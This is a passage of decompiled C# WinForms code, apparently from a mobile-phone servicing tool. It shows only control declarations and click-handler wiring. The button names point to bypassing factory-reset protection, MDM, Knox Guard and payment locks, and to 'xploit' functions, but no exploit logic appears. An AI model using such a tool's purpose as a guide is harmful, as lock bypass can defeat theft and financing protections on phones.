				if (btnMsjTelcelNew != null)
				{
					btnMsjTelcelNew.Click += value2;
				}
			}
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x0600017D RID: 381 RVA: 0x0001598B File Offset: 0x00013B8B
		// (set) Token: 0x0600017E RID: 382 RVA: 0x00015995 File Offset: 0x00013B95
		internal virtual Button btnxploit5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x0600017F RID: 383 RVA: 0x0001599E File Offset: 0x00013B9E
		// (set) Token: 0x06000180 RID: 384 RVA: 0x000159A8 File Offset: 0x00013BA8
		internal virtual Button btnRemovePayOld
		{
			[CompilerGenerated]
			get
			{
				return this._btnRemovePayOld;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRemovePayOld_Click);
				Button btnRemovePayOld = this._btnRemovePayOld;
				if (btnRemovePayOld != null)
				{
					btnRemovePayOld.Click -= value2;
				}
				this._btnRemovePayOld = value;
				btnRemovePayOld = this._btnRemovePayOld;
				if (btnRemovePayOld != null)
				{
					btnRemovePayOld.Click += value2;
				}
			}
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000181 RID: 385 RVA: 0x000159EB File Offset: 0x00013BEB
		// (set) Token: 0x06000182 RID: 386 RVA: 0x000159F8 File Offset: 0x00013BF8
		internal virtual Button btnMsjTelcelOld
		{
			[CompilerGenerated]
			get
			{
				return this._btnMsjTelcelOld;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnMsjTelcelOld_Click);
				Button btnMsjTelcelOld = this._btnMsjTelcelOld;
				if (btnMsjTelcelOld != null)
				{
					btnMsjTelcelOld.Click -= value2;
				}
				this._btnMsjTelcelOld = value;
				btnMsjTelcelOld = this._btnMsjTelcelOld;
				if (btnMsjTelcelOld != null)
				{
					btnMsjTelcelOld.Click += value2;
				}
			}
		}

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000183 RID: 387 RVA: 0x00015A3B File Offset: 0x00013C3B
		// (set) Token: 0x06000184 RID: 388 RVA: 0x00015A48 File Offset: 0x00013C48
		internal virtual Button btnQRFRP
		{
			[CompilerGenerated]
			get
			{
				return this._btnQRFRP;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnQRFRP_Click_);
				Button btnQRFRP = this._btnQRFRP;
				if (btnQRFRP != null)
				{
					btnQRFRP.Click -= value2;
				}
				this._btnQRFRP = value;
				btnQRFRP = this._btnQRFRP;
				if (btnQRFRP != null)
				{
					btnQRFRP.Click += value2;
				}
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000185 RID: 389 RVA: 0x00015A8B File Offset: 0x00013C8B
		// (set) Token: 0x06000186 RID: 390 RVA: 0x00015A98 File Offset: 0x00013C98
		internal virtual Button btnRemovePayNew
		{
			[CompilerGenerated]
			get
			{
				return this._btnRemovePayNew;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRemovePayNew_Click);
				Button btnRemovePayNew = this._btnRemovePayNew;
				if (btnRemovePayNew != null)
				{
					btnRemovePayNew.Click -= value2;
				}
				this._btnRemovePayNew = value;
				btnRemovePayNew = this._btnRemovePayNew;
				if (btnRemovePayNew != null)
				{
					btnRemovePayNew.Click += value2;
				}
			}
		}

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000187 RID: 391 RVA: 0x00015ADB File Offset: 0x00013CDB
		// (set) Token: 0x06000188 RID: 392 RVA: 0x00015AE5 File Offset: 0x00013CE5
		internal virtual Button btnxploit6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000189 RID: 393 RVA: 0x00015AEE File Offset: 0x00013CEE
		// (set) Token: 0x0600018A RID: 394 RVA: 0x00015AF8 File Offset: 0x00013CF8
		internal virtual Button btnxploit7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x0600018B RID: 395 RVA: 0x00015B01 File Offset: 0x00013D01
		// (set) Token: 0x0600018C RID: 396 RVA: 0x00015B0C File Offset: 0x00013D0C
		internal virtual Button btnInstallITadmin
		{
			[CompilerGenerated]
			get
			{
				return this._btnInstallITadmin;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnInstallITadmin_Click);
				Button btnInstallITadmin = this._btnInstallITadmin;
				if (btnInstallITadmin != null)
				{
					btnInstallITadmin.Click -= value2;
				}
				this._btnInstallITadmin = value;
				btnInstallITadmin = this._btnInstallITadmin;
				if (btnInstallITadmin != null)
				{
					btnInstallITadmin.Click += value2;
				}
			}
		}

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x0600018D RID: 397 RVA: 0x00015B4F File Offset: 0x00013D4F
		// (set) Token: 0x0600018E RID: 398 RVA: 0x00015B5C File Offset: 0x00013D5C
		internal virtual Button btnFixITadmin
		{
			[CompilerGenerated]
			get
			{
				return this._btnFixITadmin;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnFixITadmin_Click_);
				Button btnFixITadmin = this._btnFixITadmin;
				if (btnFixITadmin != null)
				{
					btnFixITadmin.Click -= value2;
				}
				this._btnFixITadmin = value;
				btnFixITadmin = this._btnFixITadmin;
				if (btnFixITadmin != null)
				{
					btnFixITadmin.Click += value2;
				}
			}
		}

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600018F RID: 399 RVA: 0x00015B9F File Offset: 0x00013D9F
		// (set) Token: 0x06000190 RID: 400 RVA: 0x00015BA9 File Offset: 0x00013DA9
		internal virtual TabControl Tstool { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000191 RID: 401 RVA: 0x00015BB2 File Offset: 0x00013DB2
		// (set) Token: 0x06000192 RID: 402 RVA: 0x00015BBC File Offset: 0x00013DBC
		internal virtual TabPage Home { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x06000193 RID: 403 RVA: 0x00015BC5 File Offset: 0x00013DC5
		// (set) Token: 0x06000194 RID: 404 RVA: 0x00015BCF File Offset: 0x00013DCF
		internal virtual TabPage Samsung { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000195 RID: 405 RVA: 0x00015BD8 File Offset: 0x00013DD8
		// (set) Token: 0x06000196 RID: 406 RVA: 0x00015BE2 File Offset: 0x00013DE2
		internal virtual TabPage Motorola { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000197 RID: 407 RVA: 0x00015BEB File Offset: 0x00013DEB
		// (set) Token: 0x06000198 RID: 408 RVA: 0x00015BF5 File Offset: 0x00013DF5
		internal virtual TabPage Modelos { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000199 RID: 409 RVA: 0x00015BFE File Offset: 0x00013DFE
		// (set) Token: 0x0600019A RID: 410 RVA: 0x00015C08 File Offset: 0x00013E08
		internal virtual ListBox lstModels { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x0600019B RID: 411 RVA: 0x00015C11 File Offset: 0x00013E11
		// (set) Token: 0x0600019C RID: 412 RVA: 0x00015C1C File Offset: 0x00013E1C
		internal virtual ListBox lstBrands
		{
			[CompilerGenerated]
			get
			{
				return this._lstBrands;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.lstBrands_SelectedIndexChanged);
				ListBox lstBrands = this._lstBrands;
				if (lstBrands != null)
				{
					lstBrands.SelectedIndexChanged -= value2;
				}
				this._lstBrands = value;
				lstBrands = this._lstBrands;
				if (lstBrands != null)
				{
					lstBrands.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x0600019D RID: 413 RVA: 0x00015C5F File Offset: 0x00013E5F
		// (set) Token: 0x0600019E RID: 414 RVA: 0x00015C6C File Offset: 0x00013E6C
		internal virtual TextBox txtSearch
		{
			[CompilerGenerated]
			get
			{
				return this._txtSearch;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.txtSearch_GotFocus);
				EventHandler value3 = new EventHandler(this.txtSearch_LostFocus);
				EventHandler value4 = new EventHandler(this.txtSearch_TextChanged);
				TextBox txtSearch = this._txtSearch;
				if (txtSearch != null)
				{
					txtSearch.GotFocus -= value2;
					txtSearch.LostFocus -= value3;
					txtSearch.TextChanged -= value4;
				}
				this._txtSearch = value;
				txtSearch = this._txtSearch;
				if (txtSearch != null)
				{
					txtSearch.GotFocus += value2;
					txtSearch.LostFocus += value3;
					txtSearch.TextChanged += value4;
				}
			}
		}

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x0600019F RID: 415 RVA: 0x00015CE5 File Offset: 0x00013EE5
		// (set) Token: 0x060001A0 RID: 416 RVA: 0x00015CEF File Offset: 0x00013EEF
		internal virtual TabPage ITAdmin { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x060001A1 RID: 417 RVA: 0x00015CF8 File Offset: 0x00013EF8
		// (set) Token: 0x060001A2 RID: 418 RVA: 0x00015D04 File Offset: 0x00013F04
		internal virtual Button btnPlayOriginal
		{
			[CompilerGenerated]
			get
			{
				return this._btnPlayOriginal;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnPlayOriginal_Click);
				Button btnPlayOriginal = this._btnPlayOriginal;
				if (btnPlayOriginal != null)
				{
					btnPlayOriginal.Click -= value2;
				}
				this._btnPlayOriginal = value;
				btnPlayOriginal = this._btnPlayOriginal;
				if (btnPlayOriginal != null)
				{
					btnPlayOriginal.Click += value2;
				}
			}
		}

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x060001A3 RID: 419 RVA: 0x00015D47 File Offset: 0x00013F47
		// (set) Token: 0x060001A4 RID: 420 RVA: 0x00015D54 File Offset: 0x00013F54
		internal virtual Button btnitadminall
		{
			[CompilerGenerated]
			get
			{
				return this._btnitadminall;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnitadminall_Click);
				Button btnitadminall = this._btnitadminall;
				if (btnitadminall != null)
				{
					btnitadminall.Click -= value2;
				}
				this._btnitadminall = value;
				btnitadminall = this._btnitadminall;
				if (btnitadminall != null)
				{
					btnitadminall.Click += value2;
				}
			}
		}

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x060001A5 RID: 421 RVA: 0x00015D97 File Offset: 0x00013F97
		// (set) Token: 0x060001A6 RID: 422 RVA: 0x00015DA4 File Offset: 0x00013FA4
		internal virtual Button btnXploitZ
		{
			[CompilerGenerated]
			get
			{
				return this._btnXploitZ;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnXploitZ_Click);
				Button btnXploitZ = this._btnXploitZ;
				if (btnXploitZ != null)
				{
					btnXploitZ.Click -= value2;
				}
				this._btnXploitZ = value;
				btnXploitZ = this._btnXploitZ;
				if (btnXploitZ != null)
				{
					btnXploitZ.Click += value2;
				}
			}
		}

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x060001A7 RID: 423 RVA: 0x00015DE7 File Offset: 0x00013FE7
		// (set) Token: 0x060001A8 RID: 424 RVA: 0x00015DF1 File Offset: 0x00013FF1
		internal virtual TabPage HuaweiHonor { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x060001A9 RID: 425 RVA: 0x00015DFA File Offset: 0x00013FFA
		// (set) Token: 0x060001AA RID: 426 RVA: 0x00015E04 File Offset: 0x00014004
		internal virtual Button btnmdmnewatt
		{
			[CompilerGenerated]
			get
			{
				return this._btnmdmnewatt;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnmdmnewatt_Click);
				Button btnmdmnewatt = this._btnmdmnewatt;
				if (btnmdmnewatt != null)
				{
					btnmdmnewatt.Click -= value2;
				}
				this._btnmdmnewatt = value;
				btnmdmnewatt = this._btnmdmnewatt;
				if (btnmdmnewatt != null)
				{
					btnmdmnewatt.Click += value2;
				}
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x060001AB RID: 427 RVA: 0x00015E47 File Offset: 0x00014047
		// (set) Token: 0x060001AC RID: 428 RVA: 0x00015E54 File Offset: 0x00014054
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ListView1_DoubleClick);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick -= value2;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.DoubleClick += value2;
				}
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x060001AD RID: 429 RVA: 0x00015E97 File Offset: 0x00014097
		// (set) Token: 0x060001AE RID: 430 RVA: 0x00015EA4 File Offset: 0x000140A4
		internal virtual Button btnReadFastboot
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadFastboot;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadFastboot_Click);
				Button btnReadFastboot = this._btnReadFastboot;
				if (btnReadFastboot != null)
				{
					btnReadFastboot.Click -= value2;
				}
				this._btnReadFastboot = value;
				btnReadFastboot = this._btnReadFastboot;
				if (btnReadFastboot != null)
				{
					btnReadFastboot.Click += value2;
				}
			}
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060001AF RID: 431 RVA: 0x00015EE7 File Offset: 0x000140E7
		// (set) Token: 0x060001B0 RID: 432 RVA: 0x00015EF4 File Offset: 0x000140F4
		internal virtual ComboBox cmbDevices
		{
			[CompilerGenerated]
			get
			{
				return this._cmbDevices;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.cmbDevices_SelectedIndexChanged);
				ComboBox cmbDevices = this._cmbDevices;
				if (cmbDevices != null)
				{
					cmbDevices.SelectedIndexChanged -= value2;
				}
				this._cmbDevices = value;
				cmbDevices = this._cmbDevices;
				if (cmbDevices != null)
				{
					cmbDevices.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x060001B1 RID: 433 RVA: 0x00015F37 File Offset: 0x00014137
		// (set) Token: 0x060001B2 RID: 434 RVA: 0x00015F44 File Offset: 0x00014144
		internal virtual Button btncheckport
		{
			[CompilerGenerated]
			get
			{
				return this._btncheckport;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btncheckport_Click);
				Button btncheckport = this._btncheckport;
				if (btncheckport != null)
				{
					btncheckport.Click -= value2;
				}
				this._btncheckport = value;
				btncheckport = this._btncheckport;
				if (btncheckport != null)
				{
					btncheckport.Click += value2;
				}
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060001B3 RID: 435 RVA: 0x00015F87 File Offset: 0x00014187
		// (set) Token: 0x060001B4 RID: 436 RVA: 0x00015F94 File Offset: 0x00014194
		internal virtual Button btnReadAdbAll
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadAdbAll;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadAdbAll_Click);
				Button btnReadAdbAll = this._btnReadAdbAll;
				if (btnReadAdbAll != null)
				{
					btnReadAdbAll.Click -= value2;
				}
				this._btnReadAdbAll = value;
				btnReadAdbAll = this._btnReadAdbAll;
				if (btnReadAdbAll != null)
				{
					btnReadAdbAll.Click += value2;
				}
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060001B5 RID: 437 RVA: 0x00015FD7 File Offset: 0x000141D7
		// (set) Token: 0x060001B6 RID: 438 RVA: 0x00015FE4 File Offset: 0x000141E4
		internal virtual Button btnopenfwmt
		{
			[CompilerGenerated]
			get
			{
				return this._btnopenfwmt;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnOpenFwMt_Click);
				Button btnopenfwmt = this._btnopenfwmt;
				if (btnopenfwmt != null)
				{
					btnopenfwmt.Click -= value2;
				}
				this._btnopenfwmt = value;
				btnopenfwmt = this._btnopenfwmt;
				if (btnopenfwmt != null)
				{
					btnopenfwmt.Click += value2;
				}
			}
		}

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060001B7 RID: 439 RVA: 0x00016027 File Offset: 0x00014227
		// (set) Token: 0x060001B8 RID: 440 RVA: 0x00016034 File Offset: 0x00014234
		internal virtual Button btndwlfwmt
		{
			[CompilerGenerated]
			get
			{
				return this._btndwlfwmt;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btndwlfwmt_Click);
				Button btndwlfwmt = this._btndwlfwmt;
				if (btndwlfwmt != null)
				{
					btndwlfwmt.Click -= value2;
				}
				this._btndwlfwmt = value;
				btndwlfwmt = this._btndwlfwmt;
				if (btndwlfwmt != null)
				{
					btndwlfwmt.Click += value2;
				}
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060001B9 RID: 441 RVA: 0x00016077 File Offset: 0x00014277
		// (set) Token: 0x060001BA RID: 442 RVA: 0x00016084 File Offset: 0x00014284
		internal virtual Button btnConsultarPosiblesBloqueos
		{
			[CompilerGenerated]
			get
			{
				return this._btnConsultarPosiblesBloqueos;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnConsultarPosiblesBloqueos_Click);
				Button btnConsultarPosiblesBloqueos = this._btnConsultarPosiblesBloqueos;
				if (btnConsultarPosiblesBloqueos != null)
				{
					btnConsultarPosiblesBloqueos.Click -= value2;
				}
				this._btnConsultarPosiblesBloqueos = value;
				btnConsultarPosiblesBloqueos = this._btnConsultarPosiblesBloqueos;
				if (btnConsultarPosiblesBloqueos != null)
				{
					btnConsultarPosiblesBloqueos.Click += value2;
				}
			}
		}

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060001BB RID: 443 RVA: 0x000160C7 File Offset: 0x000142C7
		// (set) Token: 0x060001BC RID: 444 RVA: 0x000160D4 File Offset: 0x000142D4
		internal virtual Button btnCleanMotoApps
		{
			[CompilerGenerated]
			get
			{
				return this._btnCleanMotoApps;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCleanMotoApps_Click);
				Button btnCleanMotoApps = this._btnCleanMotoApps;
				if (btnCleanMotoApps != null)
				{
					btnCleanMotoApps.Click -= value2;
				}
				this._btnCleanMotoApps = value;
				btnCleanMotoApps = this._btnCleanMotoApps;
				if (btnCleanMotoApps != null)
				{
					btnCleanMotoApps.Click += value2;
				}
			}
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060001BD RID: 445 RVA: 0x00016117 File Offset: 0x00014317
		// (set) Token: 0x060001BE RID: 446 RVA: 0x00016124 File Offset: 0x00014324
		internal virtual Button btnMDMTecno
		{
			[CompilerGenerated]
			get
			{
				return this._btnMDMTecno;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnBuscarYEditar_Click);
				Button btnMDMTecno = this._btnMDMTecno;
				if (btnMDMTecno != null)
				{
					btnMDMTecno.Click -= value2;
				}
				this._btnMDMTecno = value;
				btnMDMTecno = this._btnMDMTecno;
				if (btnMDMTecno != null)
				{
					btnMDMTecno.Click += value2;
				}
			}
		}

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060001BF RID: 447 RVA: 0x00016167 File Offset: 0x00014367
		// (set) Token: 0x060001C0 RID: 448 RVA: 0x00016174 File Offset: 0x00014374
		internal virtual Button btnComparar
		{
			[CompilerGenerated]
			get
			{
				return this._btnComparar;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnComparar_Click);
				Button btnComparar = this._btnComparar;
				if (btnComparar != null)
				{
					btnComparar.Click -= value2;
				}
				this._btnComparar = value;
				btnComparar = this._btnComparar;
				if (btnComparar != null)
				{
					btnComparar.Click += value2;
				}
			}
		}

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060001C1 RID: 449 RVA: 0x000161B7 File Offset: 0x000143B7
		// (set) Token: 0x060001C2 RID: 450 RVA: 0x000161C4 File Offset: 0x000143C4
		internal virtual Button BtnPatchFileMotorola
		{
			[CompilerGenerated]
			get
			{
				return this._BtnPatchFileMotorola;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BtnPatchFileMotorola_Click);
				Button btnPatchFileMotorola = this._BtnPatchFileMotorola;
				if (btnPatchFileMotorola != null)
				{
					btnPatchFileMotorola.Click -= value2;
				}
				this._BtnPatchFileMotorola = value;
				btnPatchFileMotorola = this._BtnPatchFileMotorola;
				if (btnPatchFileMotorola != null)
				{
					btnPatchFileMotorola.Click += value2;
				}
			}
		}

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060001C3 RID: 451 RVA: 0x00016207 File Offset: 0x00014407
		// (set) Token: 0x060001C4 RID: 452 RVA: 0x00016214 File Offset: 0x00014414
		internal virtual Button btnPatchFileOppo
		{
			[CompilerGenerated]
			get
			{
				return this._btnPatchFileOppo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnPatchFileOppo_Click);
				Button btnPatchFileOppo = this._btnPatchFileOppo;
				if (btnPatchFileOppo != null)
				{
					btnPatchFileOppo.Click -= value2;
				}
				this._btnPatchFileOppo = value;
				btnPatchFileOppo = this._btnPatchFileOppo;
				if (btnPatchFileOppo != null)
				{
					btnPatchFileOppo.Click += value2;
				}
			}
		}

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060001C5 RID: 453 RVA: 0x00016257 File Offset: 0x00014457
		// (set) Token: 0x060001C6 RID: 454 RVA: 0x00016264 File Offset: 0x00014464
		internal virtual Button BtnPatchFileHonor
		{
			[CompilerGenerated]
			get
			{
				return this._BtnPatchFileHonor;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BtnPatchFileHonor_Click);
				Button btnPatchFileHonor = this._BtnPatchFileHonor;
				if (btnPatchFileHonor != null)
				{
					btnPatchFileHonor.Click -= value2;
				}
				this._BtnPatchFileHonor = value;
				btnPatchFileHonor = this._BtnPatchFileHonor;
				if (btnPatchFileHonor != null)
				{
					btnPatchFileHonor.Click += value2;
				}
			}
		}

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060001C7 RID: 455 RVA: 0x000162A7 File Offset: 0x000144A7
		// (set) Token: 0x060001C8 RID: 456 RVA: 0x000162B1 File Offset: 0x000144B1
		internal virtual TabPage Tools { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060001C9 RID: 457 RVA: 0x000162BA File Offset: 0x000144BA
		// (set) Token: 0x060001CA RID: 458 RVA: 0x000162C4 File Offset: 0x000144C4
		internal virtual Button btnfu
		{
			[CompilerGenerated]
			get
			{
				return this._btnfu;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnfu_Click);
				Button btnfu = this._btnfu;
				if (btnfu != null)
				{
					btnfu.Click -= value2;
				}
				this._btnfu = value;
				btnfu = this._btnfu;
				if (btnfu != null)
				{
					btnfu.Click += value2;
				}
			}
		}

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060001CB RID: 459 RVA: 0x00016307 File Offset: 0x00014507
		// (set) Token: 0x060001CC RID: 460 RVA: 0x00016314 File Offset: 0x00014514
		internal virtual Button btnfacto
		{
			[CompilerGenerated]
			get
			{
				return this._btnfacto;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnfacto_Click);
				Button btnfacto = this._btnfacto;
				if (btnfacto != null)
				{
					btnfacto.Click -= value2;
				}
				this._btnfacto = value;
				btnfacto = this._btnfacto;
				if (btnfacto != null)
				{
					btnfacto.Click += value2;
				}
			}
		}

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060001CD RID: 461 RVA: 0x00016357 File Offset: 0x00014557
		// (set) Token: 0x060001CE RID: 462 RVA: 0x00016364 File Offset: 0x00014564
		internal virtual Button btnKgNew
		{
			[CompilerGenerated]
			get
			{
				return this._btnKgNew;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnKgNew_Click);
				Button btnKgNew = this._btnKgNew;
				if (btnKgNew != null)
				{
					btnKgNew.Click -= value2;
				}
				this._btnKgNew = value;
				btnKgNew = this._btnKgNew;
				if (btnKgNew != null)
				{
					btnKgNew.Click += value2;
				}
			}
		}

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060001CF RID: 463 RVA: 0x000163A7 File Offset: 0x000145A7
		// (set) Token: 0x060001D0 RID: 464 RVA: 0x000163B4 File Offset: 0x000145B4
		internal virtual Button btnkglocktoactive
		{
			[CompilerGenerated]
			get
			{
				return this._btnkglocktoactive;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnkglocktoactive_Click);
				Button btnkglocktoactive = this._btnkglocktoactive;
				if (btnkglocktoactive != null)
				{
					btnkglocktoactive.Click -= value2;
				}
				this._btnkglocktoactive = value;
				btnkglocktoactive = this._btnkglocktoactive;
				if (btnkglocktoactive != null)
				{
					btnkglocktoactive.Click += value2;
				}
			}
		}

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x000163F7 File Offset: 0x000145F7
		// (set) Token: 0x060001D2 RID: 466 RVA: 0x00016404 File Offset: 0x00014604
		internal virtual Button BtnUnlockPixel
		{
			[CompilerGenerated]
			get
			{
				return this._BtnUnlockPixel;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnUnlockPixel_Click);
				Button btnUnlockPixel = this._BtnUnlockPixel;
				if (btnUnlockPixel != null)
				{
					btnUnlockPixel.Click -= value2;
				}
				this._BtnUnlockPixel = value;
				btnUnlockPixel = this._BtnUnlockPixel;
				if (btnUnlockPixel != null)
				{
					btnUnlockPixel.Click += value2;
				}
			}
		}

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060001D3 RID: 467 RVA: 0x00016447 File Offset: 0x00014647
		// (set) Token: 0x060001D4 RID: 468 RVA: 0x00016454 File Offset: 0x00014654
		internal virtual Button btnCleanMDMApps
		{
			[CompilerGenerated]
			get
			{
				return this._btnCleanMDMApps;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCleanMDMApps_Click);
				Button btnCleanMDMApps = this._btnCleanMDMApps;
				if (btnCleanMDMApps != null)
				{
					btnCleanMDMApps.Click -= value2;
				}
				this._btnCleanMDMApps = value;
				btnCleanMDMApps = this._btnCleanMDMApps;
				if (btnCleanMDMApps != null)
				{
					btnCleanMDMApps.Click += value2;
				}
			}
		}

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060001D5 RID: 469 RVA: 0x00016497 File Offset: 0x00014697
		// (set) Token: 0x060001D6 RID: 470 RVA: 0x000164A4 File Offset: 0x000146A4
		internal virtual Button btnRebootDevice
		{
			[CompilerGenerated]
			get
			{
				return this._btnRebootDevice;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRebootDevice_Click);
				Button btnRebootDevice = this._btnRebootDevice;
				if (btnRebootDevice != null)
				{
					btnRebootDevice.Click -= value2;
				}
				this._btnRebootDevice = value;
				btnRebootDevice = this._btnRebootDevice;
				if (btnRebootDevice != null)
				{
					btnRebootDevice.Click += value2;
				}
			}
		}

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060001D7 RID: 471 RVA: 0x000164E7 File Offset: 0x000146E7
		// (set) Token: 0x060001D8 RID: 472 RVA: 0x000164F4 File Offset: 0x000146F4
